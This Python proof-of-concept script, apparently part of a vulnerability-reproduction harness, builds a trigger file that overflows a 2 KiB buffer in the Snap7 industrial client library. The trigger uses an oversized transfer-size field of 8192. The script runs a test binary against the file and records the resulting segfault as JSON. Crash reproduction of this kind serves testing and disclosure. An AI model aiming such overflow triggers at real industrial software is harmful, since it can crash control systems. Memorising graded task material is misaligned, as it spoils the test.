#!/usr/bin/env python3
"""PoC generator for the s7dl industrial-client test harness.

Constructs a trigger file (8-byte little-endian header + caller data buffer)
and runs the target binary against it, capturing the result as a fixed JSON
contract.

The trigger file format is:
    bytes 0..4  : little-endian signed i32  (start offset)
    bytes 4..8  : little-endian signed i32  (transfer size)
    bytes 8..   : caller data buffer

The harness (Rust binary `s7dl`) parses `start`, `size`, and the remaining
bytes as `buff`, prints `start=.. size=.. buff_len=..`, then performs the
data-transfer through the Snap7 client library.  A `size` field at or above
2046 (the library's internal fixed buffer) is copied out of bounds and crashes
the process with SIGSEGV.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


# Transfer parameters that reliably overflow the library's internal 2 KiB
# fixed scratch buffer and segfault the target.
START_OFFSET = 0
TRANSFER_SIZE = 8192
DATA_BUFFER = b"\x41" * 16  # arbitrary caller-supplied buffer bytes


def build_payload():
    """Dynamically construct the 8-byte header + data-buffer payload bytes."""
    header = struct.pack("<ii", START_OFFSET, TRANSFER_SIZE)
    return header + DATA_BUFFER


def signal_name(returncode):
    """Map a negative returncode to its signal name, or None."""
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return signal.Signals(signum).name
    except ValueError:
        return "SIG%d" % signum


def normalize(text):
    """Collapse all runs of whitespace into single spaces for stable evidence."""
    return " ".join(text.split())


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Generate a trigger and run the target binary once."
    )
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None, help="optional path to write JSON")
    parser.add_argument("--timeout", type=float, default=30.0, help="run timeout seconds")
    args = parser.parse_args(argv)

    binary = args.binary
    payload = build_payload()

    # Write the dynamically-built payload to a temporary trigger file.
    fd, trigger_path = tempfile.mkstemp(prefix="s7dl-trigger-", suffix=".trig")
    try:
        with os.fdopen(fd, "wb") as fh:
            fh.write(payload)
    except Exception:
        os.close(fd)
        raise

    command = [binary, trigger_path]

    result = {
        "binary": binary,
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {
            "kind": "combined_output",
            "value": "",
            "path": None,
        },
        "error": None,
    }

    stdout = ""
    stderr = ""
    returncode = None
    timed_out = False
    error = None

    start_ts = time.time()
    try:
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=args.timeout,
        )
        returncode = proc.returncode
        stdout = proc.stdout.decode("utf-8", errors="replace")
        stderr = proc.stderr.decode("utf-8", errors="replace")
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        returncode = None
        # Preserve any partial output the target emitted before the timeout.
        if exc.stdout is not None:
            stdout = exc.stdout.decode("utf-8", errors="replace")
        if exc.stderr is not None:
            stderr = exc.stderr.decode("utf-8", errors="replace")
        error = "timed out after %.3fs" % args.timeout
    except OSError as exc:
        error = "failed to execute binary: %s" % exc
    finally:
        runtime_ms = int(round((time.time() - start_ts) * 1000.0))

    sig_name = signal_name(returncode)
    combined = (stdout + "\n" + stderr).strip()

    result["returncode"] = returncode
    result["signal"] = sig_name
    result["timed_out"] = timed_out
    result["runtime_ms"] = runtime_ms
    result["stdout"] = stdout
    result["stderr"] = stderr
    result["error"] = error

    if sig_name is not None:
        result["observable"] = {
            "kind": "crash_trace",
            "value": "returncode=%d signal=%s %s" % (
                returncode, sig_name, normalize(combined)
            ),
            "path": None,
        }
    else:
        result["observable"] = {
            "kind": "combined_output",
            "value": normalize(combined),
            "path": None,
        }

    # Clean up the temporary trigger file.
    try:
        os.unlink(trigger_path)
    except OSError:
        pass

    doc = json.dumps(result, sort_keys=True)
    sys.stdout.write(doc + "\n")

    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(doc + "\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())